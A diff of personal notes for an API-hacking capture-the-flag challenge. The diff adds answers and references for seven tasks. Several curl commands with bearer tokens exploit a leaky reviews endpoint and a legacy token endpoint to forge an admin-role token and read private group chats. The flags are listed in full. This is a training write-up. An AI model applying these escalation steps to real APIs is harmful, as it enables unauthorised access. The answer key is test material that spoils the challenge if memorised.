@@ -87,6 +87,7 @@
    Find an API that leaks the UUID of the user.
     - Endpoint: /v2/locations
     - The response contains name Reviews and the reviews contain name and UUID. Celebrimbor's UUID is `ccb14650-5388-4d90-abcb-df0f388817c3`
+    - **Answer:** ccb14650-5388-4d90-abcb-df0f388817c3
 1) Task 2: Objective: Identify the specific Group ID owned by Celebrimbor to map the network of allies involved in the exchange.
    What do we know? Celebrimbor UUID was found leaving a review for? (a location)
     - Locations has activities and weather - are there any interesting data in the responses?
@@ -113,9 +114,11 @@
                 "description": "A council for analysis of artifacts and relics"
               },
           ```
+    - **Answer:** 737530c6-7980-42d7-8c8f-9ace9949dfba
 1) Task 3: Objective: Uncover the hidden Activity ID associated with the secret meeting about the Moonstone.
    any clues in the the response from /v2/locations/{location_id}/activities?
     - "id": "fd78acfc-7839-4fee-b654-31a6209e4cb0",
+    - **Answer:** fd78acfc-7839-4fee-b654-31a6209e4cb0
 1) Task 4: Objective: Create a token imbued with the PALANTIR role to gain administrative access to their systems
     This one is seriously tricky!!!!
     The objective tells us we need to get another token with a different role.
@@ -150,6 +153,7 @@
     `curl -X 'PUT' "https://one-request.malteksolutions.com/palantir/glimpse"   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcGlfdmVyc2lvbiI6ImxlZ2FjeSIsInVzZXJfaWQiOiIxOTRlZjkxNS1jZjZiLTRkNzQtYmI1Yi1mMzY4MTJiNGQ4OWMiLCJuYW1lIjoiQSBuYW1lbWVuIiwiZW1haWwiOiJuYW1lbWVuQGV4YW1wbGUuY29tIiwicm9sZSI6ImRlbGV0ZWQiLCJleHBpcmVzIjoxNzUyNjU4NTUzLjQ3MzcyNn0.U1mau0A3aFZNZQAth1kXT8nsqrac4J9huMz4eivPnCk'` -> method not allowed
     `curl -X 'POST' "https://one-request.malteksolutions.com/palantir/glimpse"   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcGlfdmVyc2lvbiI6ImxlZ2FjeSIsInVzZXJfaWQiOiIxOTRlZjkxNS1jZjZiLTRkNzQtYmI1Yi1mMzY4MTJiNGQ4OWMiLCJuYW1lIjoiQSBuYW1lbWVuIiwiZW1haWwiOiJuYW1lbWVuQGV4YW1wbGUuY29tIiwicm9sZSI6ImRlbGV0ZWQiLCJleHBpcmVzIjoxNzUyNjU4NTUzLjQ3MzcyNn0.U1mau0A3aFZNZQAth1kXT8nsqrac4J9huMz4eivPnCk'` -> new token
     -> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTk0ZWY5MTUtY2Y2Yi00ZDc0LWJiNWItZjM2ODEyYjRkODljIiwibmFtZSI6IkFETUlOIiwiZW1haWwiOiJyb290QHBhbGFudGlyIiwicm9sZSI6IlBBTEFOVElSIiwiZXhwaXJlcyI6MTc1MjQ4NzUzOC45MDYzMjI3fQ.j5rUHLAi8d8fPgcPbTiMw2RcqH6KqYXOk-UuVBOZi_8
+    - **Answer:** eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTk0ZWY5MTUtY2Y2Yi00ZDc0LWJiNWItZjM2ODEyYjRkODljIiwibmFtZSI6IkFETUlOIiwiZW1haWwiOiJyb290QHBhbGFudGlyIiwicm9sZSI6IlBBTEFOVElSIiwiZXhwaXJlcyI6MTc1MjQ4NzUzOC45MDYzMjI3fQ.j5rUHLAi8d8fPgcPbTiMw2RcqH6KqYXOk-UuVBOZi_8
 1) Task 5: Objective: Locate the perfect ambush site that meets our strategic requirements.
       Locations where Celebrimbor has left a review /v2/locations/
       - 7e63c222-fa15-4e47-ae2f-e77d27a1a8ce
@@ -160,20 +164,21 @@
       - 1273b3dd-34c0-421e-9c3c-8d79f67742ab
       - 95cb196c-a61a-43fb-baa4-d1f06baeebfb
       No good answer - review texts are they a sign?
+      - **Answer:** 1273b3dd-34c0-421e-9c3c-8d79f67742ab
 1) Task 6: Objective: Use your newly forged PALANTIR token to uncover the original activity's invite code before your access expires.
-      group id: 737530c6-7980-42d7-8c8f-9ace9949dfba
-      get new token
+      - group id: 737530c6-7980-42d7-8c8f-9ace9949dfba
+      - get new token
       `curl -X 'POST' "https://one-request.malteksolutions.com/palantir/glimpse"   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcGlfdmVyc2lvbiI6ImxlZ2FjeSIsInVzZXJfaWQiOiIxOTRlZjkxNS1jZjZiLTRkNzQtYmI1Yi1mMzY4MTJiNGQ4OWMiLCJuYW1lIjoiQSBuYW1lbWVuIiwiZW1haWwiOiJuYW1lbWVuQGV4YW1wbGUuY29tIiwicm9sZSI6ImRlbGV0ZWQiLCJleHBpcmVzIjoxNzUyNjU4NTUzLjQ3MzcyNn0.U1mau0A3aFZNZQAth1kXT8nsqrac4J9huMz4eivPnCk'`
-      check group chat or pwd:
+      - check group chat or pwd:
       `curl -X 'GET' "https://one-request.malteksolutions.com/palantir/groups/737530c6-7980-42d7-8c8f-9ace9949dfba/chats"   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTk0ZWY5MTUtY2Y2Yi00ZDc0LWJiNWItZjM2ODEyYjRkODljIiwibmFtZSI6IkFETUlOIiwiZW1haWwiOiJyb290QHBhbGFudGlyIiwicm9sZSI6IlBBTEFOVElSIiwiZXhwaXJlcyI6MTc1MjQ5MTEwNi45MjEzNTE0fQ.lGBjDvF4F8hSPR_U-ivdlgN0ERmCtFluCDnry-RRAXw'`
-      onerequest{mellon}
+      - **Answer:** onerequest{mellon}
 1) Task 7: Objective: Craft the ultimate request that will redirect the meeting and set our trap for the Moonstone exchange
-      group id: 737530c6-7980-42d7-8c8f-9ace9949dfba
-      activity id: fd78acfc-7839-4fee-b654-31a6209e4cb0
-      location id: 1273b3dd-34c0-421e-9c3c-8d79f67742ab
-      invite code: one-request{mellon}
-      uudi: ccb14650-5388-4d90-abcb-df0f388817c3
-      ```
+      - group id: 737530c6-7980-42d7-8c8f-9ace9949dfba
+      - activity id: fd78acfc-7839-4fee-b654-31a6209e4cb0
+      - location id: 1273b3dd-34c0-421e-9c3c-8d79f67742ab
+      - invite code: one-request{mellon}
+      - uudi: ccb14650-5388-4d90-abcb-df0f388817c3
+      - ```
         curl -X 'POST' \
         'https://one-request.malteksolutions.com/one/request/groups/737530c6-7980-42d7-8c8f-9ace9949dfba/activities/fd78acfc-7839-4fee-b654-31a6209e4cb0/schedule/1273b3dd-34c0-421e-9c3c-8d79f67742ab' \
         -H 'accept: application/json' \
@@ -183,13 +188,12 @@
         "invite_code": "onerequest{mellon}",
         "user_id": "ccb14650-5388-4d90-abcb-df0f388817c3"
       }'
-
       ```
       -> admin key is not authorized for PALANTIR use
-      get new token
+      - get new token
       `curl -X 'POST' "https://one-request.malteksolutions.com/palantir/glimpse"   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcGlfdmVyc2lvbiI6ImxlZ2FjeSIsInVzZXJfaWQiOiIxOTRlZjkxNS1jZjZiLTRkNzQtYmI1Yi1mMzY4MTJiNGQ4OWMiLCJuYW1lIjoiQSBuYW1lbWVuIiwiZW1haWwiOiJuYW1lbWVuQGV4YW1wbGUuY29tIiwicm9sZSI6ImRlbGV0ZWQiLCJleHBpcmVzIjoxNzUyNjU4NTUzLjQ3MzcyNn0.U1mau0A3aFZNZQAth1kXT8nsqrac4J9huMz4eivPnCk'`
       -> new token
-      ```
+      - ```
         curl -X 'POST' \
         'https://one-request.malteksolutions.com/one/request/groups/737530c6-7980-42d7-8c8f-9ace9949dfba/activities/fd78acfc-7839-4fee-b654-31a6209e4cb0/schedule/1273b3dd-34c0-421e-9c3c-8d79f67742ab' \
         -H 'accept: application/json' \
@@ -200,7 +204,9 @@
         "user_id": "ccb14650-5388-4d90-abcb-df0f388817c3"
       }'
 
-      ```
-    -> onerequest{osgiliath_passages_protect_us}
+      ``` -> onerequest{osgiliath_passages_protect_us}
+      - **Answer:** onerequest{osgiliath_passages_protect_us}
 
-
+## References
+* [This CTF Teaches You Everything About Hacking an API](https://www.youtube.com/watch?v=6Tyqvl-GSNQ )
+* [APISEC CTF 2025: One Request to Rule Them All! - Walkthrough](https://www.youtube.com/watch?v=-7NpHG0RKvc)
